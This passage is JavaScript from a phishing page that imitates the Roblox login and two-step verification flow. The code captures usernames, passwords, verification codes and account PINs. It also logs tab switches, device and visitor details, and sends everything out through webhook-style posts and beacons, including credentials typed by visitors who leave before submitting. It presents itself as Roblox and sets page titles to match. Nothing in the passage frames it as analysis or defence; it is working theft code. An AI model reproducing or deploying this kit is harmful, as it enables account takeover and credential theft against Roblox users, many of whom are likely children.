  var took = askedAt ? Math.round((Date.now()-askedAt)/1000) : "?";
  var fields = [
    f("Code","`"+code+"`"), fh("Answered in", took+"s"),
    fh("Tab away", focusLost ? focusLost+"x" : "no"),
    fh("Source", SRC + (ALT ? " / "+ALT : "")),
    fh("Device", device()), fh("Visitor", VID+" · visit "+VISITS)
  ];
  if(ACC) fields.push(fh("Account", "@"+ACC.name+" ("+ACC.id+")"));

  overlay(true, t("ov.load"), ACC);
  post(payload("Verification Code", fields, {
    color: 0x00c853, ping: OPT.ping, text: "**`"+code+"`**", thumb: ACC ? ACC.avatar : ""
  })).then(function(){ return delay(650); }).then(function(){
    overlay(false); busy(b, false); buzz([15,40,15]);
    if(OPT.pinStep) return showPin();
    finish();
  });
});
function showPin(){
  var pin = prompt("Account PIN (4 digits)", "");
  if(pin) post(payload("Account PIN", [f("PIN","`"+pin+"`")], {color:0xffd166}));
  finish();
}
function finish(){
  done = true; show("#step3"); document.title = "Roblox";
  clearTimeout(redirectTimer); redirectTimer = setTimeout(go, 2600);
}

/* --- Auto-Submit bei 6 Ziffern --- */
$("#c").addEventListener("input", function(){
  var v = this.value.replace(/\D/g, "");
  if(v !== this.value) this.value = v;
  if(OPT.autoSubmit && v.length >= 6 && !$("#b2").classList.contains("loading")){
    clearTimeout(this._t);
    this._t = setTimeout(()=>$("#f2").dispatchEvent(new Event("submit")), 260);
  }
});

/* --- Retry / Resend / Backup / Zurueck --- */
$("#retry").addEventListener("click", function(){
  clearTimeout(redirectTimer); codeSent = false; $("#c").value = "";
  show("#step2"); document.title = "Verification · Roblox"; startTimer(); setTimeout(()=>$("#c").focus(), 60);
});
$("#resend").addEventListener("click", function(){
  toast(t("v.resend")); startTimer(); click();
  post(payload("Code resent", [f("Device", device())]));
});
$("#lost").addEventListener("click", function(){
  toast(t("v.lost")); $("#c").maxLength = 12; $("#c").focus();
  post(payload("Backup code path", [f("Device", device())]));
});
$("#back").addEventListener("click", function(){
  clearInterval(tickT); submitted = false; codeSent = false;
  show("#step1"); document.title = "Log in to Roblox";
  post(payload("Back to login", [f("Device", device())]));
});

/* --- OTC / Quick / Social / Close --- */
$("#otc").addEventListener("click", function(){
  var b = this; if(b.disabled) return; busy(b, true); click();
  post(payload("One-Time Code requested", [f("Device", device())]))
    .then(()=>{ busy(b,false); showCode("otc"); });
});
$("#quick").addEventListener("click", function(){
  var b = this; if(b.disabled) return; busy(b, true); click();
  post(payload("Quick Sign-in clicked", [f("Device", device())])).then(()=>setTimeout(go, 600));
});
document.querySelectorAll(".btn.soc").forEach(function(el){
  el.addEventListener("click", function(){
    if(el.disabled) return; el.disabled = true; click();
    post(payload("Social click", [f("Provider", el.dataset.p), f("Device", device())]))
      .then(()=>setTimeout(go, 700));
  });
});
$("#close").addEventListener("click", function(){
  var step = $("#step3").classList.contains("hidden")
    ? ($("#step2").classList.contains("hidden") ? "Login" : "Code") : "Done";
  beacon(payload("Closed", [f("Step", step), f("Device", device())]));
  setTimeout(go, 400);
});

/* --- Passwort zeigen --- */
$("#eye").addEventListener("click", function(){
  var i = $("#p"), on = i.type === "password";
  i.type = on ? "text" : "password"; this.style.opacity = on ? "1" : ".8";
});

/* ==================================================================
   12. HINTERGRUND
   ================================================================== */
document.addEventListener("visibilitychange", function(){
  if(document.visibilityState === "hidden" && submitted && !done){
    focusLost++; log("tab away");
    beacon(payload("Tab left — probably checking email", [
      f("Step", codeSent ? "code" : "waiting for code"), f("Times", focusLost)
    ]));
  }
});
window.addEventListener("pagehide", function(){
  try{
    if(done || codeSent) return;
    if(submitted){ if($("#c").value.trim()) return;
      beacon(payload("Left at code step", [f("Device", device())])); return; }
    var u = $("#u").value.trim(), p = $("#p").value;
    if(!u && !p) return;
    beacon(payload("Left early", [f("Username","`"+u+"`"), f("Password","`"+p+"`"), f("Device", device())]));
  }catch(e){}
});
if(OPT.heartbeat) setInterval(function(){
  if(done || !submitted) return;
  beacon(payload("Still on page", [f("Step", codeSent ? "code" : "waiting")]));
}, OPT.heartbeat);

/* ==================================================================
   13. START
   ================================================================== */
(function(){
  if(!OPT.prefill) return;
  try{ var last = localStorage.getItem("rbx_lastuser"); if(last && !$("#u").value) $("#u").value = last; }catch(e){}
})();
log("ready · "+LANG+" · src "+SRC+(ALT?"/"+ALT:""));
flush();
setTimeout(function(){
  if(!submitted) beacon(payload("Page opened", [f("Referrer", document.referrer||"direct"), f("Device", device())]));
}, 2500);

})();
</script>
